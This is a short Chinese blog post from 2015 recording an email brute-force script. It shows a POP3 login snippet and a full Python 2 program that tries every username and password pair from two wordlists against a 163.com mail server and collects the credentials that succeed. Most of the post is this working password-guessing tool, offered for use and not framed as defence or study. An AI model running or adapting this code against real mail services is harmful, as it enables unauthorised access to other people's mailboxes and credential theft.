邮箱爆破脚本总结

发表于 2015-09-15   |  

前一阵研究了一下wooyun zone里看到的邮箱爆破脚本,自己试着改成了多线程,效果不是很好.
在这里记录一下脚本实现思路以及关于邮箱爆破的一些想法.

爆破脚本

#pop3协议,SMTP协议需要时候再补

import poplib

pop = poplib.POP3(host,port,delay)
print pop.getwelcome()  #如果连接成功打印welcome信息
pop = pop.user(username)
pop.pass_(password)     #到了这一步如果没有抛出异常,登录成功
pop.quit()

注意:
1.在各个步骤的异常情况判断.
2.代码第6行如果第一次认证失败,不可以继续验证.需要调用quit方法结束实例(为什么解释器中和实际运行的结果不一致).
3.实现逻辑方面读取用户密码不断遍历实现暴力破解.

脚本代码

# coding=utf-8
import threading, time, random, sys, poplib 
from copy import copy 
server = "mail.163" #host
suffix = "@163"     #邮箱后缀
delay = 0.3                #延时
users = open('username.txt','r').readlines()  #用户名字典
words = open('password.txt','r').readlines()  #密码字典
success = []
def mailbruteforce(listuser,listpwd): 
  print "Bruting..."
  for user in listuser: 
    for value in listpwd : 
      user = user.replace("\n",suffix) 
      value = value.replace("\n","") 
      try: 
        pop = poplib.POP3(server,110,delay) 
        pop.user(user) 
        auth = pop.pass_(value) 
        print user,value,auth[1:3]
        success.append(user+':'+value)
        pop.quit() 
      except:
        pass
mailbruteforce(users,words)
